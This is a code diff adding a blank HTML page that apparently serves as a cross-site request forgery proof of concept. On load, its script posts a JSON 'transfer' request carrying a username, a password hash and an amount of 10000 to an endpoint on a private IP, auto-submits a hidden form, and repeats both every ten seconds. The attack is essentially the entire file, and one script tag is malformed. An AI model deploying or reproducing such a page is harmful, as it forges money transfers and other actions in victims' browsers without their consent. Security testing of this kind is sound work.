@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title></title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="" />
+  </head>
+  <body>
+    <form
+      name="myForm"
+      id="myForm"
+      target="_myFrame"
+      action="test.php"
+      method="POST"
+    >
+      <p>
+        <input name="user_to" value="test" />
+      </p>
+      <p>
+        <input type="submit" value="Submit" />
+      </p>
+    </form>
+
+    <script type="text/javascript">
+                  window.onload=function(){
+                      var auto = setTimeout(function(){ autoRefresh(); }, 100);
+                      let data = {"username":"user1@gmail.com","passwordhash":"$2b$06$fYII2dmDiW8n8pkjowfz7.YXxAr7KXLj9NQ4.Bj7h8W23rN5aFX/i","money":10000};
+                      function submitform(){
+                        fetch("http://192.168.2.98:49698/transfer", {
+          method: "POST",
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        }).then(res => {
+          console.log("Request complete! response:", res);
+        });
+                        document.forms["myForm"].submit();
+      }
+
+                      function autoRefresh(){
+                         clearTimeout(auto);
+                         auto = setTimeout(function(){ submitform(); autoRefresh(); }, 10000);
+                      }
+                  }
+              </script
+
+              <script src="" async defer>
+    </script>
+  </body>
+</html>
